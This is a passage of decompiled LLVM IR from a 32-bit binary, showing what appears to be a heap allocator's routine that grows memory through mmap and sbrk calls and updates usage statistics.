  store i32 %v1_80509d0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050dd2

dec_label_pc_80509d8:                             ; preds = %dec_label_pc_8050925, %dec_label_pc_80506e0, %dec_label_pc_80506e8
  %v0_80509d8 = load i32, i32* @global_var_805336c.33, align 4
  store i32 %v0_80509d8, i32* @ebx, align 4
  %v1_80509e2 = add i32 %.v1_80506ce, 16
  store i32 %v1_80509e2, i32* @esi, align 4
  %v1_80509e5 = add i32 %v0_80509d8, 4
  %v2_80509e5 = inttoptr i32 %v1_80509e5 to i32*
  %v3_80509e5 = load i32, i32* %v2_80509e5, align 4
  %v1_80509ec = and i32 %v3_80509e5, -4
  store i32 %v1_80509ec, i32* %ecx.global-to-local, align 4
  %v7_80509ef = icmp ult i32 %v1_80509ec, %v1_80509e2
  br i1 %v7_80509ef, label %dec_label_pc_8050a0f, label %dec_label_pc_80509f3

dec_label_pc_80509f3:                             ; preds = %dec_label_pc_80509d8
  %v2_80509f7 = add i32 %v0_80509d8, %.v1_80506ce
  store i32 %v2_80509f7, i32* @edx, align 4
  %v1_80509fa = or i32 %.v1_80506ce, 1
  store i32 %v1_80509fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80509f7, i32* @global_var_805336c.33, align 4
  store i32 %v1_80509fa, i32* %v2_80509e5, align 4
  %v0_8050a06 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8050a06 = sub i32 %v0_8050a06, %.v1_80506ce
  store i32 %v5_8050a06, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050d62

dec_label_pc_8050a0f:                             ; preds = %dec_label_pc_80509d8
  %v0_8050a0f = load i32, i32* @global_var_805369c.38, align 4
  store i32 %v0_8050a0f, i32* %edx.global-to-local, align 4
  %v0_8050a15 = load i8, i8* @global_var_8053340.32, align 64
  %v1_8050a15 = and i8 %v0_8050a15, 2
  %v2_8050a15 = icmp eq i8 %v1_8050a15, 0
  br i1 %v2_8050a15, label %dec_label_pc_8050a43, label %dec_label_pc_8050a1e

dec_label_pc_8050a1e:                             ; preds = %dec_label_pc_8050a0f
  store i32 ptrtoint (i8* @global_var_8053340.32 to i32), i32* %stack_var_-92, align 4
  %v2_8050a26 = call i32 @function_8051296(i32* bitcast (i8* @global_var_8053340.32 to i32*))
  store i32 ptrtoint (i8* @global_var_8053340.32 to i32), i32* @ebx, align 4
  %v1_8050a30 = add i32 %.v1_80506ce, -7
  store i32 %v1_8050a30, i32* %eax.global-to-local, align 4
  store i32 %v1_8050a30, i32* %stack_var_-92, align 4
  %v1_8050a34 = call i32 @function_8050679(i32 %v1_8050a30)
  store i32 %v1_8050a34, i32* %eax.global-to-local, align 4
  store i32 %v1_8050a34, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050dd2

dec_label_pc_8050a43:                             ; preds = %dec_label_pc_8050a0f
  %v1_8050a43 = add i32 %v0_8050a0f, -1
  store i32 %v1_8050a43, i32* @ecx, align 4
  store i32 %.v1_80506ce, i32* @ebx, align 4
  %v1_8050a4e = load i32, i32* @global_var_805368c.39, align 4
  %v7_8050a4e = icmp ult i32 %.v1_80506ce, %v1_8050a4e
  br i1 %v7_8050a4e, label %dec_label_pc_8050b10, label %dec_label_pc_8050a5a

dec_label_pc_8050a5a:                             ; preds = %dec_label_pc_8050a43
  %v0_8050a5a = load i32, i32* @global_var_8053690.40, align 16
  store i32 %v0_8050a5a, i32* %eax.global-to-local, align 4
  %v1_8050a5f = load i32, i32* @global_var_8053694.41, align 4
  %v5_8050a65 = icmp slt i32 %v0_8050a5a, %v1_8050a5f
  br i1 %v5_8050a65, label %dec_label_pc_8050a6b, label %dec_label_pc_8050b10

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a5a
  %v2_8050a6d = add i32 %.v1_80506ce, 10
  %v3_8050a6d = add i32 %v2_8050a6d, %v0_8050a0f
  %v1_8050a71 = sub i32 0, %v0_8050a0f
  store i32 %v1_8050a71, i32* %eax.global-to-local, align 4
  %v2_8050a73 = and i32 %v3_8050a6d, %v1_8050a71
  store i32 %v2_8050a73, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8050a73, %.v1_80506ce
  br i1 %tmp127, label %dec_label_pc_8050a7f, label %dec_label_pc_8050b10

dec_label_pc_8050a7f:                             ; preds = %dec_label_pc_8050a6b
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050a8c = call i32 @function_8051ebc(i32 0, i32 %v2_8050a73, i32 3, i32 34, i32 0, i32 0, i32 %v1_8050a43, i32 %v1_8050a43)
  store i32 %v8_8050a8c, i32* %eax.global-to-local, align 4
  store i32 %v8_8050a8c, i32* @edx, align 4
  %v10_8050a96 = icmp eq i32 %v8_8050a8c, -1
  br i1 %v10_8050a96, label %dec_label_pc_8050a7f.dec_label_pc_8050b10_crit_edge, label %dec_label_pc_8050a9b

dec_label_pc_8050a7f.dec_label_pc_8050b10_crit_edge: ; preds = %dec_label_pc_8050a7f
  %v0_8050b10.pre = load i32, i32* @global_var_805336c.33, align 4
  br label %dec_label_pc_8050b10

dec_label_pc_8050a9b:                             ; preds = %dec_label_pc_8050a7f
  %v1_8050a9d = urem i32 %v8_8050a8c, 8
  %v2_8050a9d = icmp eq i32 %v1_8050a9d, 0
  store i32 %v1_8050a9d, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050a9d, label %dec_label_pc_8050ab5, label %dec_label_pc_8050aa2

dec_label_pc_8050aa2:                             ; preds = %dec_label_pc_8050a9b
  %v0_8050aa7 = load i32, i32* @ebx, align 4
  %v2_8050aa9 = sub nsw i32 8, %v1_8050a9d
  store i32 %v2_8050aa9, i32* %eax.global-to-local, align 4
  %v2_8050aab = add i32 %v2_8050aa9, %v8_8050a8c
  store i32 %v2_8050aab, i32* @edx, align 4
  %v2_8050aad = sub i32 %v0_8050aa7, %v2_8050aa9
  store i32 %v2_8050aad, i32* %esi.global-to-local, align 4
  %v2_8050aaf = inttoptr i32 %v2_8050aab to i32*
  store i32 %v2_8050aa9, i32* %v2_8050aaf, align 4
  br label %dec_label_pc_8050abd

dec_label_pc_8050ab5:                             ; preds = %dec_label_pc_8050a9b
  %v1_8050ab5 = inttoptr i32 %v8_8050a8c to i32*
  store i32 0, i32* %v1_8050ab5, align 4
  br label %dec_label_pc_8050abd

dec_label_pc_8050abd:                             ; preds = %dec_label_pc_8050aa2, %dec_label_pc_8050ab5
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050aa2 ], [ @ebx, %dec_label_pc_8050ab5 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8050abd = or i32 %storemerge, 2
  %v1_8050ac0 = load i32, i32* @edx, align 4
  %v2_8050ac0 = add i32 %v1_8050ac0, 4
  %v3_8050ac0 = inttoptr i32 %v2_8050ac0 to i32*
  store i32 %v1_8050abd, i32* %v3_8050ac0, align 4
  %v0_8050ac3 = load i32, i32* @global_var_8053690.40, align 16
  %v1_8050ac8 = add i32 %v0_8050ac3, 1
  store i32 %v1_8050ac8, i32* %eax.global-to-local, align 4
  store i32 %v1_8050ac8, i32* @global_var_8053690.40, align 16
  %v1_8050ace = load i32, i32* @global_var_8053698.42, align 8
  %v7_8050ad4 = icmp sgt i32 %v1_8050ac8, %v1_8050ace
  br i1 %v7_8050ad4, label %dec_label_pc_8050ad6, label %dec_label_pc_8050adb

dec_label_pc_8050ad6:                             ; preds = %dec_label_pc_8050abd
  store i32 %v1_8050ac8, i32* @global_var_8053698.42, align 8
  br label %dec_label_pc_8050adb

dec_label_pc_8050adb:                             ; preds = %dec_label_pc_8050abd, %dec_label_pc_8050ad6
  %v0_8050adb = load i32, i32* @global_var_80536a4.43, align 4
  %v1_8050ae0 = load i32, i32* @ebx, align 4
  %v2_8050ae0 = add i32 %v1_8050ae0, %v0_8050adb
  store i32 %v2_8050ae0, i32* %eax.global-to-local, align 4
  store i32 %v2_8050ae0, i32* @global_var_80536a4.43, align 4
  %v1_8050ae7 = load i32, i32* @global_var_80536b0.44, align 16
  %tmp128 = icmp ugt i32 %v2_8050ae0, %v1_8050ae7
  br i1 %tmp128, label %dec_label_pc_8050aef, label %dec_label_pc_8050af4

dec_label_pc_8050aef:                             ; preds = %dec_label_pc_8050adb
  store i32 %v2_8050ae0, i32* @global_var_80536b0.44, align 16
  br label %dec_label_pc_8050af4

dec_label_pc_8050af4:                             ; preds = %dec_label_pc_8050adb, %dec_label_pc_8050aef
  %v1_8050af4 = load i32, i32* @global_var_80536a8.45, align 8
  %v2_8050af4 = add i32 %v1_8050af4, %v2_8050ae0
  store i32 %v2_8050af4, i32* %eax.global-to-local, align 4
  %v1_8050afa = load i32, i32* @global_var_80536b4.46, align 4
  %tmp129 = icmp ugt i32 %v2_8050af4, %v1_8050afa
  br i1 %tmp129, label %dec_label_pc_8050b06, label %dec_label_pc_8050757

dec_label_pc_8050b06:                             ; preds = %dec_label_pc_8050af4
  store i32 %v2_8050af4, i32* @global_var_80536b4.46, align 4
  br label %dec_label_pc_8050757

dec_label_pc_8050b10:                             ; preds = %dec_label_pc_8050a6b, %dec_label_pc_8050a7f.dec_label_pc_8050b10_crit_edge, %dec_label_pc_8050a5a, %dec_label_pc_8050a43
  %v0_8050b10 = phi i32 [ %v0_8050b10.pre, %dec_label_pc_8050a7f.dec_label_pc_8050b10_crit_edge ], [ %v0_80509d8, %dec_label_pc_8050a5a ], [ %v0_80509d8, %dec_label_pc_8050a6b ], [ %v0_80509d8, %dec_label_pc_8050a43 ]
  store i32 %v0_8050b10, i32* %eax.global-to-local, align 4
  %v1_8050b19 = add i32 %v0_8050b10, 4
  %v2_8050b19 = inttoptr i32 %v1_8050b19 to i32*
  %v3_8050b19 = load i32, i32* %v2_8050b19, align 4
  %v1_8050b23 = and i32 %v3_8050b19, -4
  %v2_8050b23 = icmp eq i32 %v1_8050b23, 0
  store i32 %v1_8050b23, i32* @ebp, align 4
  %v1_8050b26 = load i32, i32* @global_var_8053688.47, align 8
  %v2_8050b26 = add i32 %v1_8050b26, %v1_80509e2
  store i32 %v2_8050b26, i32* %eax.global-to-local, align 4
  %v0_8050b2c = load i8, i8* @global_var_80536a0.48, align 32
  %v1_8050b2c = urem i8 %v0_8050b2c, 2
  %v2_8050b2c = icmp eq i8 %v1_8050b2c, 0
  br i1 %v2_8050b2c, label %dec_label_pc_8050b37, label %dec_label_pc_8050b35

dec_label_pc_8050b35:                             ; preds = %dec_label_pc_8050b10
  %v2_8050b35 = sub i32 %v2_8050b26, %v1_8050b23
  store i32 %v2_8050b35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b37

dec_label_pc_8050b37:                             ; preds = %dec_label_pc_8050b10, %dec_label_pc_8050b35
  %v0_8050b3b = phi i32 [ %v2_8050b26, %dec_label_pc_8050b10 ], [ %v2_8050b35, %dec_label_pc_8050b35 ]
  %v5_8050b3b = add i32 %v0_8050b3b, %v1_8050a43
  store i32 %v5_8050b3b, i32* %eax.global-to-local, align 4
  %v1_8050b3f = sub i32 0, %v0_8050a0f
  store i32 %v1_8050b3f, i32* @edx, align 4
  %v2_8050b47 = and i32 %v5_8050b3b, %v1_8050b3f
  store i32 %v2_8050b47, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_8050b47, 1
  br i1 %tmp91, label %dec_label_pc_8050b61, label %dec_label_pc_8050b4b

dec_label_pc_8050b4b:                             ; preds = %dec_label_pc_8050b37
  store i32 %v2_8050b47, i32* %stack_var_-92, align 4
  %v1_8050b4f = call i32 @function_805236d(i32 %v2_8050b47)
  store i32 %v1_8050b4f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8050b4f, i32* @ebx, align 4
  %v10_8050b5c = icmp eq i32 %v1_8050b4f, -1
  %v1_8050b5f = icmp eq i1 %v10_8050b5c, false
  br i1 %v1_8050b5f, label %dec_label_pc_8050bb7.dec_label_pc_8050bc0_crit_edge, label %dec_label_pc_8050b4b.dec_label_pc_8050b61_crit_edge

dec_label_pc_8050b4b.dec_label_pc_8050b61_crit_edge: ; preds = %dec_label_pc_8050b4b
  %v0_8050b61.pre = load i8, i8* @global_var_80536a0.48, align 32
  br label %dec_label_pc_8050b61

dec_label_pc_8050b61:                             ; preds = %dec_label_pc_8050b4b.dec_label_pc_8050b61_crit_edge, %dec_label_pc_8050b37
  %v0_8050b8d = phi i32 [ -1, %dec_label_pc_8050b4b.dec_label_pc_8050b61_crit_edge ], [ %v1_8050b3f, %dec_label_pc_8050b37 ]
  %v0_8050b61 = phi i8 [ %v0_8050b61.pre, %dec_label_pc_8050b4b.dec_label_pc_8050b61_crit_edge ], [ %v0_8050b2c, %dec_label_pc_8050b37 ]
  %v1_8050b61 = urem i8 %v0_8050b61, 2
  %v2_8050b61 = icmp eq i8 %v1_8050b61, 0
  br i1 %v2_8050b61, label %dec_label_pc_8050b61.dec_label_pc_8050b76_crit_edge, label %dec_label_pc_8050b6a

dec_label_pc_8050b61.dec_label_pc_8050b76_crit_edge: ; preds = %dec_label_pc_8050b61
  %v0_8050b76.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050b76

dec_label_pc_8050b6a:                             ; preds = %dec_label_pc_8050b61
  %v2_8050b6e = add i32 %v1_8050b23, %v1_8050a43
  store i32 %v2_8050b6e, i32* %eax.global-to-local, align 4
  %v0_8050b70 = load i32, i32* @esi, align 4
  %v2_8050b70 = add i32 %v0_8050b70, %v2_8050b6e
  %v5_8050b72 = and i32 %v2_8050b70, %v1_8050b3f
  store i32 %v5_8050b72, i32* @esi, align 4
  br label %dec_label_pc_8050b76

dec_label_pc_8050b76:                             ; preds = %dec_label_pc_8050b61.dec_label_pc_8050b76_crit_edge, %dec_label_pc_8050b6a
  %v0_8050b76 = phi i32 [ %v0_8050b76.pre, %dec_label_pc_8050b61.dec_label_pc_8050b76_crit_edge ], [ %v5_8050b72, %dec_label_pc_8050b6a ]
  %tmp130 = icmp ult i32 %v0_8050b76, 1048576
  br i1 %tmp130, label %dec_label_pc_8050b7e, label %dec_label_pc_8050b83

dec_label_pc_8050b7e:                             ; preds = %dec_label_pc_8050b76
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8050b83

dec_label_pc_8050b83:                             ; preds = %dec_label_pc_8050b76, %dec_label_pc_8050b7e
  %v0_8050b97 = phi i32 [ %v0_8050b76, %dec_label_pc_8050b76 ], [ 1048576, %dec_label_pc_8050b7e ]
  %tmp131 = icmp ugt i32 %v0_8050b97, %.v1_80506ce
  br i1 %tmp131, label %dec_label_pc_8050b8d, label %dec_label_pc_8050dc5

dec_label_pc_8050b8d:                             ; preds = %dec_label_pc_8050b83
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050b9a = call i32 @function_8051ebc(i32 0, i32 %v0_8050b97, i32 3, i32 34, i32 0, i32 0, i32 %v0_8050b8d, i32 %v0_8050b8d)
  store i32 %v8_8050b9a, i32* %eax.global-to-local, align 4
  store i32 %v8_8050b9a, i32* @ebx, align 4
  %v10_8050ba4 = icmp eq i32 %v8_8050b9a, -1
  br i1 %v10_8050ba4, label %dec_label_pc_8050dc5, label %dec_label_pc_8050bb7.thread

dec_label_pc_8050bb7.thread:                      ; preds = %dec_label_pc_8050b8d
  %v0_8050bad = load i8, i8* @global_var_80536a0.48, align 1
  %v2_8050bad = and i8 %v0_8050bad, -2
  store i8 %v2_8050bad, i8* @global_var_80536a0.48, align 32
  %v1_8050bb4 = load i32, i32* @esi, align 4
  %v2_8050bb4 = add i32 %v1_8050bb4, %v8_8050b9a
  store i32 %v2_8050bb4, i32* @edx, align 4
  br label %dec_label_pc_8050bc0

dec_label_pc_8050bb7.dec_label_pc_8050bc0_crit_edge: ; preds = %dec_label_pc_8050b4b
  %v1_8050bc4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050bc0

dec_label_pc_8050bc0:                             ; preds = %dec_label_pc_8050bb7.dec_label_pc_8050bc0_crit_edge, %dec_label_pc_8050bb7.thread
  %v1_8050bc4 = phi i32 [ %v1_8050bb4, %dec_label_pc_8050bb7.thread ], [ %v1_8050bc4.pre, %dec_label_pc_8050bb7.dec_label_pc_8050bc0_crit_edge ]
  %v0_8050c8c100 = phi i32 [ %v8_8050b9a, %dec_label_pc_8050bb7.thread ], [ %v1_8050b4f, %dec_label_pc_8050bb7.dec_label_pc_8050bc0_crit_edge ]
  %v0_8050c7e99 = phi i32 [ %v2_8050bb4, %dec_label_pc_8050bb7.thread ], [ -1, %dec_label_pc_8050bb7.dec_label_pc_8050bc0_crit_edge ]
  %v0_8050bc4 = load i32, i32* @global_var_80536a8.45, align 8
  %v2_8050bc4 = add i32 %v1_8050bc4, %v0_8050bc4
  store i32 %v2_8050bc4, i32* @global_var_80536a8.45, align 8
  %v2_8050bca = add i32 %v1_8050b23, %v0_8050b10
  store i32 %v2_8050bca, i32* %ecx.global-to-local, align 4
  %v2_8050bcc = sub i32 %v0_8050c8c100, %v2_8050bca
  %v12_8050bcc = icmp eq i32 %v2_8050bcc, 0
  %v10_8050bd0 = icmp eq i32 %v0_8050c7e99, -1
  %tmp132 = and i1 %v12_8050bcc, %v10_8050bd0
  br i1 %tmp132, label %dec_label_pc_8050bd5, label %dec_label_pc_8050be7

dec_label_pc_8050bd5:                             ; preds = %dec_label_pc_8050bc0
  %v2_8050bd5 = add i32 %v1_8050bc4, %v1_8050b23
  store i32 %v0_8050b10, i32* %ecx.global-to-local, align 4
  %v1_8050bdc = or i32 %v2_8050bd5, 1
  store i32 %v1_8050bdc, i32* %eax.global-to-local, align 4
  store i32 %v1_8050bdc, i32* %v2_8050b19, align 4
  br label %dec_label_pc_8050d14

dec_label_pc_8050be7:                             ; preds = %dec_label_pc_8050bc0
  %v7_8050bcc = icmp ult i32 %v0_8050c8c100, %v2_8050bca
  %v0_8050be7 = load i8, i8* @global_var_80536a0.48, align 1
  %v1_8050be7 = sext i8 %v0_8050be7 to i32
  store i32 %v1_8050be7, i32* %eax.global-to-local, align 4
  %v2_8050bec = urem i8 %v0_8050be7, 2
  %v3_8050bec = icmp eq i8 %v2_8050bec, 0
  %brmerge = or i1 %v2_8050b23, %v3_8050bec
  %v1_8050bf6 = icmp eq i1 %v7_8050bcc, false
  %or.cond97 = or i1 %v1_8050bf6, %brmerge
  br i1 %or.cond97, label %dec_label_pc_8050c00, label %dec_label_pc_8050bf8

dec_label_pc_8050bf8:                             ; preds = %dec_label_pc_8050be7
  %v1_8050bf8 = and i32 %v1_8050be7, -2
  %v4_8050bf8 = trunc i32 %v1_8050bf8 to i8
  store i32 %v1_8050bf8, i32* %eax.global-to-local, align 4
  store i8 %v4_8050bf8, i8* @global_var_80536a0.48, align 32
  br label %dec_label_pc_8050c00

dec_label_pc_8050c00:                             ; preds = %dec_label_pc_8050be7, %dec_label_pc_8050bf8
  %v0_8050c00 = phi i8 [ %v0_8050be7, %dec_label_pc_8050be7 ], [ %v4_8050bf8, %dec_label_pc_8050bf8 ]
  %v1_8050c00 = urem i8 %v0_8050c00, 2
  %v2_8050c00 = icmp eq i8 %v1_8050c00, 0
  br i1 %v2_8050c00, label %dec_label_pc_8050c7e, label %dec_label_pc_8050c09

dec_label_pc_8050c09:                             ; preds = %dec_label_pc_8050c00
  br i1 %v2_8050b23, label %dec_label_pc_8050c17, label %dec_label_pc_8050c0d

dec_label_pc_8050c0d:                             ; preds = %dec_label_pc_8050c09
  store i32 %v2_8050bcc, i32* %eax.global-to-local, align 4
  %v2_8050c11 = add i32 %v2_8050bc4, %v2_8050bcc
  store i32 %v2_8050c11, i32* @global_var_80536a8.45, align 8
  br label %dec_label_pc_8050c17

dec_label_pc_8050c17:                             ; preds = %dec_label_pc_8050c09, %dec_label_pc_8050c0d
  %v1_8050c19 = urem i32 %v0_8050c8c100, 8
  %v2_8050c19 = icmp eq i32 %v1_8050c19, 0
  store i32 %v1_8050c19, i32* %edx.global-to-local, align 4
  %v1_8050c1c = icmp eq i1 %v2_8050c19, false
  br i1 %v1_8050c1c, label %dec_label_pc_8050c24, label %dec_label_pc_8050c1e

dec_label_pc_8050c1e:                             ; preds = %dec_label_pc_8050c17
  store i32 %v0_8050c8c100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c2e

dec_label_pc_8050c24:                             ; preds = %dec_label_pc_8050c17
  %v2_8050c29 = sub nsw i32 8, %v1_8050c19
  store i32 %v2_8050c29, i32* %eax.global-to-local, align 4
  %v2_8050c2b = add i32 %v2_8050c29, %v0_8050c8c100
  store i32 %v2_8050c2b, i32* @edi, align 4
  br label %dec_label_pc_8050c2e

dec_label_pc_8050c2e:                             ; preds = %dec_label_pc_8050c1e, %dec_label_pc_8050c24
  %v0_8050c31 = phi i32 [ 0, %dec_label_pc_8050c1e ], [ %v2_8050c29, %dec_label_pc_8050c24 ]
  %v2_8050c2e = add i32 %v1_8050bc4, %v0_8050c8c100
  %v2_8050c31 = add i32 %v0_8050c31, %v1_8050b23
  store i32 %v2_8050c31, i32* %ecx.global-to-local, align 4
  %v2_8050c3a = add i32 %v2_8050c31, %v2_8050c2e
  store i32 %v2_8050c3a, i32* %edx.global-to-local, align 4
  %v2_8050c40 = add i32 %v2_8050c3a, %v1_8050a43
  %v5_8050c43 = and i32 %v2_8050c40, %v1_8050b3f
  %v2_8050c4a = sub i32 %v5_8050c43, %v2_8050c3a
  store i32 %v2_8050c4a, i32* %eax.global-to-local, align 4
  %v2_8050c4c = add i32 %v2_8050c4a, %v2_8050c31
  store i32 %v2_8050c4c, i32* @esi, align 4
  store i32 %v2_8050c4c, i32* %stack_var_-92, align 4
  %v1_8050c50 = call i32 @function_805236d(i32 %v2_8050c4c)
  store i32 %v1_8050c50, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c50, i32* @edx, align 4
  %v10_8050c5a = icmp eq i32 %v1_8050c50, -1
  %v1_8050c5d = icmp eq i1 %v10_8050c5a, false
  br i1 %v1_8050c5d, label %dec_label_pc_8050c6d, label %dec_label_pc_8050c5f

dec_label_pc_8050c5f:                             ; preds = %dec_label_pc_8050c2e
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050c64 = call i32 @function_805236d(i32 0)
  store i32 %v1_8050c64, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c64, i32* @edx, align 4
  br label %dec_label_pc_8050ca1

dec_label_pc_8050c6d:                             ; preds = %dec_label_pc_8050c2e
  %v1_8050c6d = load i32, i32* @ebx, align 4
  %v7_8050c6d = icmp ult i32 %v1_8050c50, %v1_8050c6d
  %v1_8050c6f = icmp eq i1 %v7_8050c6d, false
  br i1 %v1_8050c6f, label %dec_label_pc_8050ca6, label %dec_label_pc_8050c71

dec_label_pc_8050c71:                             ; preds = %dec_label_pc_8050c6d
  %v0_8050c71 = load i8, i8* @global_var_80536a0.48, align 1
  %v2_8050c71 = and i8 %v0_8050c71, -2
  store i8 %v2_8050c71, i8* @global_var_80536a0.48, align 32
  store i32 %v2_8050c2e, i32* @edx, align 4
  br label %dec_label_pc_8050c85

dec_label_pc_8050c7e:                             ; preds = %dec_label_pc_8050c00
  store i32 %v0_8050c8c100, i32* @edi, align 4
  br i1 %v10_8050bd0, label %dec_label_pc_8050c89, label %dec_label_pc_8050c85

dec_label_pc_8050c85:                             ; preds = %dec_label_pc_8050c7e, %dec_label_pc_8050c71
  %v0_8050ca658 = phi i32 [ %v2_8050c2e, %dec_label_pc_8050c71 ], [ %v0_8050c7e99, %dec_label_pc_8050c7e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050ca6

dec_label_pc_8050c89:                             ; preds = %dec_label_pc_8050c7e
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050c90 = call i32 @function_805236d(i32 0)
  store i32 %v1_8050c90, i32* @edx, align 4
  %v1_8050c97 = load i32, i32* @ebx, align 4
  %v2_8050c97 = sub i32 %v1_8050c90, %v1_8050c97
  %v1_8050c99 = load i32, i32* @esi, align 4
  %v2_8050c99 = sub i32 %v2_8050c97, %v1_8050c99
  store i32 %v2_8050c99, i32* %eax.global-to-local, align 4
  %v0_8050c9b = load i32, i32* @global_var_80536a8.45, align 8
  %v2_8050c9b = add i32 %v0_8050c9b, %v2_8050c99
  store i32 %v2_8050c9b, i32* @global_var_80536a8.45, align 8
  br label %dec_label_pc_8050ca1

dec_label_pc_8050ca1:                             ; preds = %dec_label_pc_8050c5f, %dec_label_pc_8050c89
  %v0_8050ca657 = phi i32 [ %v1_8050c64, %dec_label_pc_8050c5f ], [ %v1_8050c90, %dec_label_pc_8050c89 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050ca6

dec_label_pc_8050ca6:                             ; preds = %dec_label_pc_8050c6d, %dec_label_pc_8050c85, %dec_label_pc_8050ca1
  %v0_8050cab = phi i32 [ %v1_8050c50, %dec_label_pc_8050c6d ], [ %v0_8050ca658, %dec_label_pc_8050c85 ], [ %v0_8050ca657, %dec_label_pc_8050ca1 ]
  %v10_8050ca6 = icmp eq i32 %v0_8050cab, -1
  br i1 %v10_8050ca6, label %dec_label_pc_8050d14, label %dec_label_pc_8050cab

dec_label_pc_8050cab:                             ; preds = %dec_label_pc_8050ca6
  %v1_8050cab = load i32, i32* @edi, align 4
  %v2_8050cab = sub i32 %v0_8050cab, %v1_8050cab
  store i32 %v2_8050cab, i32* @edx, align 4
  store i32 %v1_8050cab, i32* @global_var_805336c.33, align 4
  %v1_8050cb3 = load i32, i32* @esi, align 4
  %v2_8050cb3 = add i32 %v1_8050cb3, %v2_8050cab
  %v1_8050cb6 = or i32 %v2_8050cb3, 1
  store i32 %v1_8050cb6, i32* %eax.global-to-local, align 4
  %v2_8050cb9 = add i32 %v1_8050cab, 4
  %v3_8050cb9 = inttoptr i32 %v2_8050cb9 to i32*
  store i32 %v1_8050cb6, i32* %v3_8050cb9, align 4
  %v0_8050cbc = load i32, i32* @global_var_80536a8.45, align 8
  %v1_8050cbc = load i32, i32* @esi, align 4
  %v2_8050cbc = add i32 %v1_8050cbc, %v0_8050cbc
  store i32 %v2_8050cbc, i32* @global_var_80536a8.45, align 8
  br i1 %v2_8050b23, label %dec_label_pc_8050d14, label %dec_label_pc_8050cc6

dec_label_pc_8050cc6:                             ; preds = %dec_label_pc_8050cab
  %v1_8050cc6 = add i32 %v1_8050b23, -12
  store i32 %v0_8050b10, i32* %ecx.global-to-local, align 4
  %v1_8050ccd = and i32 %v1_8050cc6, -8
  store i32 %v1_8050ccd, i32* %eax.global-to-local, align 4
  %v1_8050cd2 = or i32 %v1_8050ccd, 1
  store i32 %v1_8050cd2, i32* @edx, align 4
  %v5_8050cd5 = icmp ult i32 %v1_8050ccd, 15
  store i32 %v1_8050cd2, i32* %v2_8050b19, align 4
  %v0_8050cdb = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050cdb = load i32, i32* %eax.global-to-local, align 4
  %v2_8050cdb = add i32 %v0_8050cdb, 4
  %v3_8050cdb = add i32 %v2_8050cdb, %v1_8050cdb
  %v4_8050cdb = inttoptr i32 %v3_8050cdb to i32*
  store i32 5, i32* %v4_8050cdb, align 4
  %v0_8050ce3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050ce3 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ce3 = add i32 %v0_8050ce3, 8
  %v3_8050ce3 = add i32 %v2_8050ce3, %v1_8050ce3
  %v4_8050ce3 = inttoptr i32 %v3_8050ce3 to i32*
  store i32 5, i32* %v4_8050ce3, align 4
  br i1 %v5_8050cd5, label %dec_label_pc_8050d14, label %dec_label_pc_8050ced

dec_label_pc_8050ced:                             ; preds = %dec_label_pc_8050cc6
  %v0_8050cf0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050cf2 = add i32 %v0_8050cf0, 8
  store i32 %v1_8050cf2, i32* %eax.global-to-local, align 4
  %v0_8050cf5 = load i32, i32* @global_var_8053684.49, align 4
  store i32 %v0_8050cf5, i32* @ebx, align 4
  store i32 %v1_8050cf2, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8053684.49, align 4
  %v1_8050d06 = call i32 @function_805143e(i32 %v1_8050cf2)
  store i32 %v1_8050d06, i32* %eax.global-to-local, align 4
  %v0_8050d0b = load i32, i32* @ebx, align 4
  store i32 %v0_8050d0b, i32* @global_var_8053684.49, align 4
  br label %dec_label_pc_8050d14

dec_label_pc_8050d14:                             ; preds = %dec_label_pc_8050cc6, %dec_label_pc_8050cab, %dec_label_pc_8050ca6, %dec_label_pc_8050bd5, %dec_label_pc_8050ced
  %v0_8050d14 = load i32, i32* @global_var_80536a8.45, align 8
  store i32 %v0_8050d14, i32* %eax.global-to-local, align 4
  %v1_8050d19 = load i32, i32* @global_var_80536ac.50, align 4
  %tmp133 = icmp ugt i32 %v0_8050d14, %v1_8050d19
  br i1 %tmp133, label %dec_label_pc_8050d21, label %dec_label_pc_8050d26

dec_label_pc_8050d21:                             ; preds = %dec_label_pc_8050d14
  store i32 %v0_8050d14, i32* @global_var_80536ac.50, align 4
  br label %dec_label_pc_8050d26

dec_label_pc_8050d26:                             ; preds = %dec_label_pc_8050d14, %dec_label_pc_8050d21
  %v1_8050d26 = load i32, i32* @global_var_80536a4.43, align 4
  %v2_8050d26 = add i32 %v1_8050d26, %v0_8050d14
  store i32 %v2_8050d26, i32* %eax.global-to-local, align 4
  %v1_8050d2c = load i32, i32* @global_var_80536b4.46, align 4
  %tmp134 = icmp ugt i32 %v2_8050d26, %v1_8050d2c
  br i1 %tmp134, label %dec_label_pc_8050d34, label %dec_label_pc_8050d39

dec_label_pc_8050d34:                             ; preds = %dec_label_pc_8050d26
  store i32 %v2_8050d26, i32* @global_var_80536b4.46, align 4
  br label %dec_label_pc_8050d39

